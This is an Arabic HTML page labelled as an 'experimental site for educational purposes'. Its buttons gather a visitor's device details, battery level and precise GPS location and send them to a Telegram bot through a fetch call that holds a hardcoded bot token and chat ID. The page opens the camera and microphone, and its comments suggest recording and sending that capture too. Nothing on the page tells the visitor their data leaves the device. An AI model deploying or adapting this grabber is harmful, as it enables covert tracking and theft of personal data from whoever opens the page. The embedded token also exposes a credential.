<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقع تجريبي</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            max-width: 600px;
            margin: 0 auto;
        }
        button {
            background: #0088cc;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px;
        }
        button:hover {
            background: #006699;
        }
        #result {
            margin-top: 20px;
            text-align: left;
            padding: 10px;
            background: #f9f9f9;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>موقع تجريبي</h1>
        <p>هذا الموقع يطلب إذنك للوصول إلى بعض ميزات الهاتف لأغراض تعليمية.</p>
        
        <button onclick="getDeviceInfo()">جمع معلومات الجهاز</button>
        <button onclick="getLocation()">الحصول على الموقع</button>
        <button onclick="accessCamera()">فتح الكاميرا</button>
        <button onclick="accessMicrophone()">فتح الميكروفون</button>
        
        <div id="result"></div>
    </div>

    <script>
        // استبدل بمعلومات بوت التلجرام الخاص بك
        const BOT_TOKEN = "7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU";
        const CHAT_ID = "7327464581";

        // عرض النتائج في الصفحة
        const resultDiv = document.getElementById('result');

        // جمع معلومات الجهاز الأساسية
        function getDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                battery: "غير متاح",
                location: "غير متاح",
                ip: "غير متاح"
            };

            // محاولة الحصول على مستوى البطارية
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    deviceInfo.battery = `${Math.round(battery.level * 100)}%`;
                    sendToTelegram(deviceInfo);
                });
            } else {
                sendToTelegram(deviceInfo);
            }

            resultDiv.innerHTML = `<p>تم جمع معلومات الجهاز:</p><pre>${JSON.stringify(deviceInfo, null, 2)}</pre>`;
        }

        // الحصول على الموقع الجغرافي
        function getLocation() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        sendToTelegram({ location });
                        resultDiv.innerHTML = `<p>تم الحصول على الموقع:</p><pre>${JSON.stringify(location, null, 2)}</pre>`;
                    },
                    error => {
                        resultDiv.innerHTML = `<p style="color:red">خطأ في الحصول على الموقع: ${error.message}</p>`;
                    }
                );
            } else {
                resultDiv.innerHTML = "<p style='color:red'>المتصفح لا يدعم تحديد الموقع!</p>";
            }
        }

        // فتح الكاميرا
        function accessCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    resultDiv.innerHTML = "<p>تم الوصول إلى الكاميرا!</p>";
                    // يمكنك إرسال لقطة من الكاميرا إلى السيرفر (لكن هذا يتطلب المزيد من الكود)
                })
                .catch(err => {
                    resultDiv.innerHTML = `<p style="color:red">خطأ في الوصول إلى الكاميرا: ${err.message}</p>`;
                });
        }

        // فتح الميكروفون
        function accessMicrophone() {
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    resultDiv.innerHTML = "<p>تم الوصول إلى الميكروفون!</p>";
                    // يمكنك تسجيل الصوت وإرساله (لكن هذا يتطلب المزيد من الكود)
                })
                .catch(err => {
                    resultDiv.innerHTML = `<p style="color:red">خطأ في الوصول إلى الميكروفون: ${err.message}</p>`;
                });
        }

        // إرسال البيانات إلى بوت التلجرام
        function sendToTelegram(data) {
            const message = `📱 <b>بيانات جديدة:</b>\n\n<pre>${JSON.stringify(data, null, 2)}</pre>`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(res => res.json())
            .then(data => console.log("تم الإرسال!"))
            .catch(err => console.error("Error:", err));
        }
    </script>
</body>
</html>
